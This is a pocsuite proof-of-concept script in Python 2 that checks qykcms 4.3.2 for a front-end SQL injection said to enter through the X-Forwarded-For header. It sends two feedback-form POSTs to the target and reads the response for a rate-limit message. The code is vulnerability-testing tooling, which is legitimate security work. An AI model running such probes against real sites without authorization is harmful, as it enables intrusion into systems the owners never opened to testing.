#coding:utf-8

from pocsuite.net import req
from pocsuite.poc import POCBase,Output
from pocsuite.utils import register
import random
import string

def randomstr():
    return random.choice(string.ascii_letters)*5

class TestPOC(POCBase):
    name = 'front boolean sqli in qykcms version 4.3.2'
    version = '1'
    vulID = '1'
    author = ['r00tuser']
    vulType = 'SQL Injection'
    references = 'http://www.cnblogs.com/r00tuser/p/8044025.html'
    desc = '''The vulneability is caused by filter the get_ip method,
    and taker the userip into the database
    '''
    vulDate = '2017-12-15'
    createDate = '2017-12-20'
    updateDate = '2017-12-20'

    appName = 'qykcms'
    appVersion = '4.3.2'
    appPowerLink = 'http://www.qykcms.com/'
    samples = ['']

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        data= {'lang':'cn','name':randomstr(),'content':randomstr(),'email':str(randomstr()+'@qq.com'),'phone':'','attachment':''}
        headers = {'Referer': 'http://' + self.url,'X-Forwarded-For':'test'}
        httpreq = req.session()
        httpurl = self.url+'/?log=post&desc=feedback'
        #first req
        try:
            response1 = httpreq.post(httpurl,data=data,headers=headers,timeout=3)
        except Exception,e:
            pass
        #second req
        try:
            response2 = httpreq.post(httpurl,data=data,headers=headers,timeout=3)
            if response2.status_code != 200:
                return self.parse_output(result)
            response2.encoding = response2.apparent_encoding
            if u'系统限制' in response2.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
        except Exception,e:
            pass
        return self.parse_output(result)

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register(TestPOC)